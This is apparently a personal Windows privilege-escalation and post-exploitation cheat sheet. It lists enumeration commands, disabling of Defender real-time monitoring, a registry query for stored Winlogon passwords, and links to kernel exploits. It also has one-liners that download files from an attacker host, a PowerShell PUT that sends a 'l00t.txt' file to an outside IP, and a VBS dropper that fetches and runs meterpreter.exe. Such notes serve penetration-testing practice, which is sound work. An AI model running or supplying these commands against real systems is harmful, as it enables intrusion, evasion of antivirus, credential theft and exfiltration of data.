# Enum    
    whoami /priv
    ipconfig /all     
    net users   
    net localgroup
    dir /r    
    tree /a /f     
    netstat /anto   
    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
    
## Scripts
https://github.com/absolomb/Pentesting/blob/master/scripts/winenum.bat

## Powershell
    Get-ExecutionPolicy    
    Set-ExecutionPolicy Unrestricted   
    Set-MpPreference -DisableRealtimeMonitoring $true   
____   

# Exploits
## Passwords
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"    
    
## Service Exploits
### Unquoted Service Paths
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """   
    
## Kernel exploits   
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
### Tools
https://github.com/bitsadmin/wesng   
https://github.com/rasta-mouse/Watson   
### Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits   

____   


# File Transfer     
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
    copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe

    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
    
  
## Powershell
    powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
    powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
    powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Users\out  
    
    Invoke-RestMethod -Method PUT -Uri "http://10.10.14.12:8001/l00t.txt" -Body $(Get-Content l00t.txt)

## VBS 
    echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

## XM File Creation (Using copy and paste)
    PS C:\> $console = [XML] @"
    <XML CODE CODE HERE>
    "@
    /# write the xml to file:
    PS C:\> $console.save("C:\users\burmat\documents\console.xml")
 ____   
  
# Resources
## Cheat Sheets
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts
## Learn More
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
  
